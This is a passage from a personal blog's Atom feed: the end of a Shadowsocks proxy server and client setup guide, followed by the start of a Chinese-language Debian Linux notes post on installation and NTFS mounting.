&lt;div class=&quot;outline-text-2&quot; id=&quot;text-4&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://zh.wikipedia.org/zh-hans/Shadowsocks&quot;&gt;https://zh.wikipedia.org/zh-hans/Shadowsocks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://shadowsocks.com&quot;&gt;https://shadowsocks.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://shadowsocks.org/&quot;&gt;http://shadowsocks.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://morning.work/page/2015-12/install-shadowsocks-on-centos-7.html&quot;&gt;在 CentOS 7 下安装配置 shadowsocks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.linuxbabe.com/desktop-linux/how-to-install-and-use-shadowsocks-command-line-client&quot;&gt;Install And Use Shadowsocks Command Line Client on Linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://doub.io/ss-jc10/&quot;&gt;ShadowsocksR 客户端 小白使用教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://kionf.com/2016/12/15/errornote-ss/&quot;&gt;ShadowSocks启动报错undefined symbol EVP_CIPHER_CTX_cleanup&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/FelisCatus/SwitchyOmega/wiki/GFWList&quot;&gt;SwitchyOmega&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://doub.io/ss-jc25/&quot;&gt;IOS系统推荐几款支持Shadowsocks的代理软件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.jeyzhang.com/how-to-install-and-setup-shadowsocks-client-in-different-os.html&quot;&gt;各种系统下Shadowsocks客户端的安装与配置&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.jianshu.com/p/41378f4e14bc&quot;&gt;linux 配置shadowsocks代理全局代理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/guizaijianchic/article/details/78422811&quot;&gt;linux ubuntu下使用ss设置全局代理,命令行也走代理&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="Shadowsocks" /><category term="SwitchyOmega" /><summary type="html">If you have any questions abount this article, or if you have found any errors in this article, email me, please. This is my email address: zrg1390556486@gmail.com This article is for communication only, please do not use for business! The author of this article is not responsible for any consequences. thanks for your attention! 1 Server 1.1 Buy a Cloud Host DigitalOcean AWS Vultr 1.2 Solution 1: Using Original Shadowsocks Installing pip # yum install python-pip or # curl &quot;https://bootstrap.pypa.io/get-pip.py&quot; -o &quot;get-pip.py&quot; # python get-pip.py // update # pip install --upgrade pip Installing shadowsocks # pip install shadowsocks # vim /etc/shadowsocks.json { &quot;server&quot;: &quot;server_ip&quot;,//server ip address &quot;server_port&quot;: 8388,//server port &quot;local_address&quot;:&quot;127.0.0.1&quot;,//local address &quot;local_port&quot;:1080,//local port &quot;port_password&quot;:{ //multiple port &quot;9001&quot;:&quot;password9001&quot;, &quot;9002&quot;:&quot;password9002&quot;, &quot;9003&quot;:&quot;password9003&quot;, }, &quot;password&quot;: &quot;password&quot;,//password &quot;method&quot;: &quot;aes-256-cfb&quot;,//encryption &quot;timeout&quot;:600 //timeout } explanation: - &quot;server&quot;: &quot;123.123.123.123&quot; :: server ip address - &quot;server_port&quot;: 8388 :: server port - &quot;local_address&quot;:&quot;127.0.0.1&quot; :: local ip address - &quot;local_port&quot;:1080, :: local port - &quot;port_password&quot; :: port and password - &quot;password&quot;: &quot;password&quot; :: password - &quot;method&quot;: &quot;aes-256-cfb&quot; :: encrypt method, more detail:[[http://ucdok.com/project/generate_password.html][password tool]] - &quot;timeout&quot;:600 :: over time Configuring auto-start script #vim /etc/systemd/system/shadowsocks.service [Unit] Description=Shadowsocks [Service] TimeoutStartSec=0 ExecStart=/usr/bin/ssserver -c /etc/shadowsocks.json [Install] WantedBy=multi-user.target Start shadowsocks #systemctl enable shadowsocks #systemctl start shadowsocks #systemctl status shadowsocks -l Auto install script $ vim install-shadowsocks.sh, content of file from install-shadowsocks.sh # chmod +x install-shadowsocks.sh # ./install-shadowsocks.sh 1.3 Solution 2: Using docker Installing docker # yum install docker # systemctl enable docker # systemctl start docker Deploy shadowsocks # docker run -dt --name ss -p 6443:6443 mritd/shadowsocks -s &quot;-s 0.0.0.0 -p 6443 -m aes-256-cfb -k test123 --fast-open&quot; 2 Client 2.1 Linux 2.1.1 Command Line Client on Linux Linux series Debian/Ubuntu: $ sudo apt-get install python-pip $ sudo pip install shadowsocks Fedora/Centos: $ sudo yum install python-setuptools or sudo dnf install python-setuptools $ sudo easy_install pip $ sudo pip install shadowsocks OpenSUSE: $ sudo zypper install python-pip $ sudo pip install shadowsocks Archlinux: $ sudo pacman -S python-pip $ sudo pip install shadowsocks sslocal is the client software and ssserver is the server software. On some Linux distros such as ubuntu, the shadowsocks client sslocal is installed under usr/local/bin. On Others such as Arch sslocal is installed under /usr/bin. Your can use whereis command to find the exact location. $ whereis sslocal sslocal: /usr/local/bin/sslocal /etc/shadowsocks.json { &quot;server&quot;:&quot;server-ip&quot;, &quot;server_port&quot;:8000, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;your-password&quot;, &quot;timeout&quot;:600, &quot;method&quot;:&quot;aes-256-cfb&quot; } // start $ sudo sslocal -c /etc/shadowsocks.json // To run in the background $ sudo sslocal -c /etc/shadowsocks.json -d start /etc/rc.local $ sudo vim /etc/rc.local sudo sslocal -c /etc/shadowsocks.json -d start // Check if It Works # sudo systemctl status rc-local.service 2.1.2 Global Proxy Install and Configure polipo $ sudo apt install polipo $ sudo vim /etc/polipo/config logSyslog = true logFile = /var/log/polipo/polipo.log proxyAddress = &quot;0.0.0.0&quot; socksParentProxy = &quot;127.0.0.1:1080&quot; socksProxyType = socks5 chunkHighMark = 50331648 objectHighMark = 16384 serverMaxSlots = 64 serverSlots = 16 serverSlots1 = 32 Restart polipo $ sudo systemctl restart polipo Export http_proxy and https_proxy $ export http_proxy=&quot;http://127.0.0.1:8123/&quot; $ export https_proxy=&quot;https://127.0.0.1:8123/&quot; testing $ curl www.google.com 2.1.3 Solving Problem ShadowSocks start error: undefined symbol EVP_CIPHER_CTX_cleanup [Reason] openssl 1.1.0 &quot;EVP_CIPHER_CTX_cleanup&quot; is old. [Solving] $ vim /usr/local/lib/python3.5/dist-packages/shadowsocks/crypto/openssl.py VIM Command&amp;#65306; :%s/cleanup/reset/ :x not support &quot;chacha20&quot; [Solving] $ apt install m2crypto gcc -y $ wget -N --no-check-certificate https://download.libsodium.org/libsodium/releases/libsodium-1.0.8.tar.gz $ tar zxvf libsodium-1.0.8.tar.gz $ cd libsodium-1.0.8 $ sudo ./configure $ sudo make &amp;amp;&amp;amp; make install $ sudo echo &quot;include ld.so.conf.d/*.conf&quot; &amp;gt; /etc/ld.so.conf $ sudo echo &quot;/lib&quot; &amp;gt;&amp;gt; /etc/ld.so.conf $ sudo echo &quot;/usr/lib64&quot; &amp;gt;&amp;gt; /etc/ld.so.conf $ sudo echo &quot;/usr/local/lib&quot; &amp;gt;&amp;gt; /etc/ld.so.conf $ sudo ldconfig 2.2 Windows 2.2.1 Download Get shadowsocks client by sending email to zrg1390556487@gmail.com 2.2.2 Configure unzip running configuring proxy 2.3 Android 2.3.1 Download Get shadowsocks client by sending email to zrg1390556487@gmail.com 2.3.2 Configure 2.4 IOS Open &quot;App Store&quot;, To search &quot;shadowrocket&quot;. Current price: ￥12 Add server configure. Okay. 2.5 Mac OS X https://github.com/shadowsocks/ShadowsocksX-NG 3 Browser Plugin: SwitchyOmega 3.1 Download Get shadowsocks client by sending email to zrg1390556487@gmail.com 3.2 Configure set proxy set rule rule:http://autoproxy-gfwlist.googlecode.com/svn/trunk/gfwlist.txt or https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt 4 References https://zh.wikipedia.org/zh-hans/Shadowsocks https://shadowsocks.com http://shadowsocks.org/ 在 CentOS 7 下安装配置 shadowsocks Install And Use Shadowsocks Command Line Client on Linux ShadowsocksR 客户端 小白使用教程 ShadowSocks启动报错undefined symbol EVP_CIPHER_CTX_cleanup SwitchyOmega IOS系统推荐几款支持Shadowsocks的代理软件 各种系统下Shadowsocks客户端的安装与配置 linux 配置shadowsocks代理全局代理 linux ubuntu下使用ss设置全局代理,命令行也走代理</summary></entry><entry><title type="html">Debian GNU/Linux</title><link href="http://localhost:4000/linux/2018/08/06/using-debian/" rel="alternate" type="text/html" title="Debian GNU/Linux" /><published>2018-08-06T00:00:00+08:00</published><updated>2018-08-06T00:00:00+08:00</updated><id>http://localhost:4000/linux/2018/08/06/using-debian</id><content type="html" xml:base="http://localhost:4000/linux/2018/08/06/using-debian/">&lt;p&gt;
本文题目应该是“Linux 操作系统”，只因平时都是使用 Debian，所以 Title 就是“Debian GNU/Linu”）。以下就是我从开始接触 Linux 到现在的一些使用笔记。
&lt;/p&gt;

&lt;div id=&quot;outline-container-org224cacf&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org224cacf&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; Preface&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;p&gt;
欢迎阅读本册子，和其他大全图书不一样，本册子以实践的方式介绍 Linux 基础、Linux 服务架构和 Linux 实用技巧，涵盖了详尽的动手教程和实践信息，还提供了与内容相关的参考资料。本册子可以作为 Linux 的操作参考工具书。作者会持续更新与完善内容，血不流干，死不休战。
&lt;/p&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8d8ad0d&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org8d8ad0d&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 读者对象&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;dl class=&quot;org-dl&quot;&gt;
&lt;dt&gt;Linux 系统管理员&lt;/dt&gt;&lt;dd&gt;如果你是 Linux 环境下的系统管理员，那么本册子也许能为你提供一定的帮助。&lt;/dd&gt;
&lt;dt&gt;Linux 爱好者&lt;/dt&gt;&lt;dd&gt;如果你是 Linux 爱好者，本册子将告诉你部分问题的解决办法及原因。&lt;/dd&gt;
&lt;/dl&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org89bdb67&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org89bdb67&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 内容结构&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;p&gt;
本册子分为五大部分。
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一部分，获取和安装 Linux 系统，Linux 系统的初步设置，Linux 介绍。&lt;/li&gt;
&lt;li&gt;第二部分，介绍 Linux 文件、目录及磁盘的常见操作。&lt;/li&gt;
&lt;li&gt;第三部分，学习及应用 shell 脚本(script)。&lt;/li&gt;
&lt;li&gt;第四部分，Linux 进阶篇，对于 Linux 系统管理员比较实用，主要介绍 Linux 帐号管理及 ACL 权限控制，Linux 定时任务，Linux 网络，一些常见服务软件的架设。&lt;/li&gt;
&lt;li&gt;第五部分，问题解决篇，聚集常见开发、运维中遇到的各种问题的解决办法，该部分可理解为本书的附录或问题解决参考手册。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;
&lt;b&gt;编写规范&lt;/b&gt;
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;章节编码级别限制为 3 级。&lt;/li&gt;
&lt;li&gt;列表中标题与描述内容分开。&lt;/li&gt;
&lt;li&gt;保持各部分有序顺序，不能随意变更。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;
&lt;b&gt;阅读提示&lt;/b&gt;
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;阅读本文时，每个知识章节都会有「参考资料」或「References」的章节，部分实际操作章节除外。&lt;/li&gt;
&lt;li&gt;所有内容以笔记的形式编写，非权威指南类型，仅供参考。&lt;/li&gt;
&lt;li&gt;本文将会省去一些有关 Linux 的常识性介绍，比如 Unix/Linux 发展史等，更多的是以过往的经验来介绍学习 Linux 的方法或建议，试图对一些 Linux 常见、实用的实践操作进行更详尽的说明，便于后来者学习。&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgaa31277&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgaa31277&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.3&lt;/span&gt; 作者&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-3&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;b&gt;zrg&lt;/b&gt; 的 Linux 学习之路（My road of learning Linux）
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一次接触 Linux 是由于大二上学期的 Linux 基础课，但是，我并没有喜欢上这个系统，因为关于 Linux 的一切，对我来说都是陌生的，我在想我既然已经对 Windows 操作系统，又何必去瞎折腾呢，况且 Windows 可以完成 Linux 上的所有事情（后来，我发现我错了）；另一方面，可能是由于授课老师的坚毅个性，让我不想再去学习它，尽管当时我自己是多么幼稚，多么可笑。&lt;/li&gt;
&lt;li&gt;后来，当我在听说 Linux 用来当服务器使用很好的时候，我开始尝试使用它来完成一些工作的时候，开始我有点喜欢 Linux 操作系统，不断的尝试（学习）使用 Linux，发现使用 Linux 来完成编程开发越来越完美了。&lt;/li&gt;
&lt;li&gt;再后来，就是现在了，能使用它搭建一些服务，使我的生活更加方便，并将一些网站之类的放在上面，下面就是平时使用 Linux 的总结，仅供参考！&lt;/li&gt;
&lt;li&gt;尽管工作的大部分时间都在用 Windows 操作系统，但是对 Linux 系列的折腾从未停止过。&lt;/li&gt;
&lt;li&gt;现在好了，今年（2018年）1月换了一份工作，公司使用的技术基本都是 Linux 上构建的，除了正常必要性开发，使用 Windows，使用 Linux 的时间将占据工作时间的 1/3。&lt;/li&gt;
&lt;li&gt;今年5月（2019年），来深圳入职了，团队比较开放，现在我的大部分开发工作都在 Linux 下完成。&lt;/li&gt;
&lt;li&gt;#2019-06-07，持续更新中……&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;jsf&lt;/b&gt; 的 Linux 学习之路（My road of learning Linux）&lt;/li&gt;
&lt;li&gt;那些年用过的 Linux 操作系统
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;Ubuntu 12.04/14.04/16.04/18.04;&lt;/li&gt;
&lt;li&gt;CentOS 6.x/7.x;&lt;/li&gt;
&lt;li&gt;RedHat 7;&lt;/li&gt;
&lt;li&gt;Debian 7/8/9;&lt;/li&gt;
&lt;li&gt;SUSE Linux Enterprise server 11/12;&lt;/li&gt;
&lt;li&gt;Raspberry pi Debian;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc263b14&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgc263b14&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.4&lt;/span&gt; 英文太差，能学好 Linux 吗？&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-4&quot;&gt;
&lt;p&gt;
关于这个问题，可以参考一下两个链接，或许能让你收获点什么！
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;http://cs2.swfu.edu.cn/~wx672/lecture_notes/linux/en.html&quot;&gt;Linux很有趣，可我的英文太差了，怎么办？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.yinwang.org/blog-cn/2018/11/23/grammar&quot;&gt;解谜英语语法&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org35c15bc&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org35c15bc&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; Get Started&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org943feeb&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org943feeb&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; 安装(Installation)&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3d7107d&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org3d7107d&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.1.1&lt;/span&gt; 安装过程&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-1-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;安装准备
&lt;br /&gt;
首先，准备一个U盘，用来刻录系统（刻录命令：dd，用法格式：sudo dd if=xxx.iso of=/dev/sdb），到 &lt;a href=&quot;https://www.debian.org/&quot;&gt;https://www.debian.org/&lt;/a&gt; 下载 iso 镜像，注意有最小版和完整版。
&lt;br /&gt;
Windows 下的刻录软件推荐使用 UltraISO（对于新手，建议在 Windows 下完成刻录）。&lt;/li&gt;
&lt;li&gt;插入U盘，开机，开始选择安装。&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org55b2b21&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org55b2b21&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.1.2&lt;/span&gt; 主机规划与磁盘分区&lt;/h4&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org05cb91e&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org05cb91e&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.1.3&lt;/span&gt; 安装后的常用操作&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-1-3&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;b&gt;查看 Linux 发行版名称及版本号&lt;/b&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
查看 Linux 内核版本
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 方式一
$ cat /proc/version
// 方式二
$ uname -a

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
查看 Linux 系统版本
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 方式一
$ lsb_release -a //这个命令适用于所有的Linux发行版，包括Redhat、SuSE、Debian…等发行版。
// 方式二
$ cat /etc/redhat-release //这种方法只适合Redhat系的Linux
// 方式三
$ cat /etc/issue //使用所有Linux版本

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;Linux 上挂载NTFS格式文件系统&lt;/b&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;方案A（Scheme A）：使用linux-ntfs
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
获取安装
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ wget http://prdownloads.sourceforge.net/linux-ntfs/kernel-module-ntfs-2.6.18-92.el5-2.1.27-0.rr.10.11.x86_64.rpm
$ sudo rpm -ivh kernel-module-ntfs-2.6.18-92.el5-2.1.27-0.rr.10.11.x86_64.rpm

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
检查 ntfs 模块是否被加载进系统
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ /sbin/modprobe ntfs
[没有输出则代表存在；否则（otherwise）将会有错误信息（error message）报出（report）]
$ cat /proc/filesystems
[ntfs应该出现在列表中]

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
查看NTFS系统的编号
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
/sbin/fdisk -l |grep NTFS 

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
创建目录
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo mkdir -p /mnt/win_ntfs
$ sudo mount -t ntfs /dev/sda1 /mnt/win_ntfs

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;方案B（Scheme B）：使用fuse和ntfs-3g
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
获取
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ wget http://downloads.sourceforge.net/project/fuse/fuse-2.X/2.7.4/fuse-2.7.4.tar.gz?use_mirror=ncu
$ wget http://www.ntfs-3g.org/ntfs-3g-2009.4.4.tgz

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
编译安装
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ tar -zxf fuse-2.7.4.tar.gz
$ ./configure --prefix=/usr/local/fuse-2.7.4
$ sudo make 
$ sudo make install
$ tar -zxf ntfs-3g-2009.4.4.tgz
$ ./configure --prefix=/usr/local/ntfs-3
$ sudo make 
$ sudo make install 

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
检查fuse模块是否被加载进系统
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ /sbin/modprobe fuse
[没有输出则代表存在；否则将会有错误信息报出]
$ cat /proc/filesystems
[fuse应该出现在列表中]

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
查看NTFS系统的编号 
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo fdisk -l |grep NTFS 

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
挂载
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ mount ntfs-3g /dev/sda1 /mnt/win_ntfs

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;自动挂载 NTFS 格式硬盘
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
安装 ntfs-3g
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt-get install ntfs-3g

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
步骤1：编辑/etc/fstab
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo vim /etc/fstab

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org48e91bd&quot;&gt;/dev/sdb1 /mnt/ntfs/ ntfs nls-utf8,umask-0222,uid-1000,gid-1000,ro 0 0    
&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Notice:&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;If /dev/sdb1 path will change due to system configuration, I recommend that you use the UUID (Universally Unique Identifier) of the partition. To find the UUID of /dev/sdb1, enter:&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#32763;&amp;#35793;&amp;#65306;/dev/sdb1 &amp;#36335;&amp;#24452;&amp;#20250;&amp;#38543;&amp;#30528;&amp;#31995;&amp;#32479;&amp;#37197;&amp;#32622;&amp;#32780;&amp;#25913;&amp;#21464;&amp;#65292;&amp;#24314;&amp;#35758;&amp;#20351;&amp;#29992; UUID &amp;#65288;&amp;#36890;&amp;#29992;&amp;#21807;&amp;#19968;&amp;#26631;&amp;#35782;&amp;#31526;&amp;#65289;&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Note down the UUID value and update /etc/fstab as follows:&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#32763;&amp;#35793;&amp;#65306;&amp;#35760;&amp;#24405;&amp;#19979; UUID&amp;#65292;&amp;#26356;&amp;#26032; /etc/fstab &amp;#25991;&amp;#20214;&amp;#12290;&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;syntax&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;UUID=&quot;YOUR-UID-HERE&quot; /mnt/ntfs/ ntfs nls-utf8,umask-0222,uid-1000,gid-1000,ro 0 0&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;UUID&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;c2dbc0c5-a8fc-439e-aa93-51b0a61372e8&quot;&lt;/span&gt; /mnt/ntfs/ ntfs nls-utf8,umask-0222,uid-1000,gid-1000,ro 0 0
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Owning entire file system&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;UUID&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;c2dbc0c5-a8fc-439e-aa93-51b0a61372e8&quot;&lt;/span&gt; /mnt/ntfs/ ntfs uid-1000,gid-1000 0 0
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;
下面是查看 UUID 的命令。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo /sbin/blkid /dev/sda1
保存关闭文件

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
步骤2：创建目录
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo mkdir -p /mnt/ntfs

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
步骤3：测试（Test）可用性
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo mount -a
$ df -h
$ cd /mnt/ntfs
$ ls -l

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
步骤4：卸载NTFS分区
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo umount /mnt/ntfs
// or
$ sudo umount /dev/sda1

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
注意错误信息：“Read-only file system”提示
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo  mv 05Music/ /mnt/sda/sda2/
/bin/mv: inter-device move failed: '05Music/' to '/mnt/sda/sda2/05Music'; unable to remove target: Read-only file system

&lt;/pre&gt;
&lt;p&gt;
解决（Solving）：配置 /etc/fstab
&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;参考资料
&lt;a href=&quot;https://www.cyberciti.biz/faq/debian-ubuntu-linux-auto-mounting-windows-ntfs-file-system/&quot;&gt;How To Debian/Ubuntu Linux Auto Mount Windows NTFS File System&lt;/a&gt;
&lt;a href=&quot;https://wiki.archlinux.org/index.php/NTFS-3G&quot;&gt;NTFS-3G&lt;/a&gt;
&lt;a href=&quot;https://wiki.archlinux.org/index.php/Fstab_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)&quot;&gt;fstab (简体中文)&lt;/a&gt;
&lt;a href=&quot;https://wiki.archlinux.org/index.php/NTFS-3G_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)&quot;&gt;NTFS-3G (简体中文)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
&lt;b&gt;boot 加载选项修改&lt;/b&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo chmod +w /boot/grub/grub.cfg
$ sudo vim /boot/grub/grub.cfg

&lt;/pre&gt;
&lt;p&gt;
注释不需要的加载项！
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;改变 Home 目录下的目录中文名称为英文&lt;/b&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
方法1
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ vim ~/.config/user-dirs.dirs

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
